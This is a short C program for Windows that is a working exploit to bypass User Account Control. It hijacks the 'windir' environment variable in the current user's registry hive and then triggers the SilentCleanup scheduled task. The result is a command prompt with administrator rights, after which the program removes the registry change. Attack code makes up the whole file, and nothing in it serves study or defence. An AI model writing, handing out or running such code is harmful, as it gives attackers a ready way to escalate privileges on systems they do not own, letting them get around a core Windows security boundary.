#include <windows.h>
#include <stdio.h>

int main() {
    // Payload: Directly open elevated admin Command Prompt
    const char* payload = "cmd.exe\" /c \"start \"Admin CMD\" cmd.exe & echo UAC SUCCESS - ADMIN CMD OPENED > C:\\uac_final_success.txt\"";

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "windir", 0, REG_EXPAND_SZ, (const BYTE*)payload, (DWORD)strlen(payload) + 1);
        RegCloseKey(hKey);
    }

    system("schtasks /run /tn \"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\" /I");

    Sleep(18000);  // 18 seconds for 25H2

    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "windir");
        RegCloseKey(hKey);
    }

    printf("[+] Final trigger sent. Watch for Admin CMD window.\n");
    return 0;
}
